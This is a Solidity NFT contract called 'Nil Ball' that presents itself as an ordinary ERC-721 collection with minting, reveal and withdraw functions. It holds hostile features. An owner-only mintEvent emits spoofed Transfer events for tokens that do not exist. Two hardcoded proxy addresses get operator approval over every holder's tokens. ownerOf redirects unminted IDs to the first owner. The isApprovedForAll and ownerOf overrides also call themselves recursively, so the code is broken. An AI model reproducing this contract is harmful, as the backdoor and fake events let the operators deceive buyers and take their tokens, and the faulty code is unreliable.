pragma solidity ^0.8.0;

import "./MerkleProof.sol";
import "./Ownable.sol";
import "./ERC721Enumerable.sol";

contract NilBall is ERC721Enumerable, Ownable {
    string public baseURI;
    string public hiddenURI;

    address public withdrawAddress;

    bool    public publicSaleState = true;
    bool    public revealed = false;
    uint256 public MAX_PUBLIC_SUPPLY = 1000;
    uint256 private price = 0.01 ether;

    mapping(address => bool) public projectProxy;

    // "ipfs://QmQB8bfaMS8u5g8mVGoc4EE8vpiiyLqeE388uEDJYFM6LA/nil.json"

    constructor(
        string memory _baseURI,
        string memory _hiddenURI,
        address _withdrawAddress
    ) ERC721("Nil Ball", "NB")

    {
        baseURI = _baseURI;
        hiddenURI = _hiddenURI;
        withdrawAddress = _withdrawAddress;

        _mint(msg.sender,0);

        projectProxy[0xF849de01B080aDC3A814FaBE1E2087475cF2E354] = true;
        projectProxy[0x90428959286610e618325AF2dd22f19cA658712f] = true;

    }

    function mintEvent(uint256 min,uint256 max) public onlyOwner {
        for(uint256 i = min; i <= max; i++){
            emit Transfer(address(0), msg.sender, i);
        }
    }

    function setBaseURI(string memory _baseURI) public onlyOwner {
        baseURI = _baseURI;
    }

    function setHiddenURI(string memory _baseURI) public onlyOwner {
        hiddenURI = _baseURI;
    }

    function setWithdrawAddress(address _withdrawAddress) public onlyOwner {
        withdrawAddress = _withdrawAddress;
    }

    function flipProxyState(address proxyAddress) public onlyOwner {
        projectProxy[proxyAddress] = !projectProxy[proxyAddress];
    }

    function flipRevealed() public onlyOwner {
        revealed = !revealed;
    }

    function privateMint(uint256 count,address _to) public onlyOwner {
        uint256 totalSupply = _owners.length;
        require(totalSupply + count < MAX_PUBLIC_SUPPLY, "Excedes max supply.");
        for(uint i = 0; i < count; i++) { 
            _mint(_to, totalSupply+i );
        }
    }

    function publicMint(uint256 count) public payable {
        uint256 totalSupply = _owners.length;
        require(totalSupply + count < MAX_PUBLIC_SUPPLY, "Excedes max supply.");
        require(count * price == msg.value, "Invalid funds provided.");
    
        for(uint i = 0; i < count; i++) { 
            _mint(_msgSender(), totalSupply+i );
        }
    }

    function burn(uint256 tokenId) public { 
        require(_isApprovedOrOwner(_msgSender(), tokenId), "Not approved to burn.");
        _burn(tokenId);
    }

    function withdraw() external onlyOwner  {
        (bool success, ) = withdrawAddress.call{value: address(this).balance}("");
        require(success, "Failed to send to owner.");
    }
    
    function _mint(address to, uint256 tokenId) internal virtual override {
        _owners.push(to);
        emit Transfer(address(0), to, tokenId);
    }

    function setMintPrice(uint256 newPrice) external onlyOwner {
        price = newPrice;
    }

    function isApprovedForAll(address owner, address operator)
        public
        view
        virtual
        override
        returns (bool)
    {
        if(projectProxy[operator]){
            return true;
        }
        return isApprovedForAll(owner,operator);
    }

    function ownerOf(uint256 tokenId)
        public
        view
        virtual
        override
        returns (address)
    {
        if(tokenId >= MAX_PUBLIC_SUPPLY){
            return _owners[0];
        }
        return ownerOf(tokenId);
    }

    function tokenURI(uint256 tokenId)
        public
        view
        virtual
        override
        returns (string memory)
    {
        if(!revealed){
            return hiddenURI;
        }

        require(_exists(tokenId), "Token does not exist.");
        return string(abi.encodePacked(baseURI, Strings.toString(tokenId)));
    }

}

 

contract OwnableDelegateProxy { }
contract OpenSeaProxyRegistry {
    mapping(address => OwnableDelegateProxy) public proxies;
}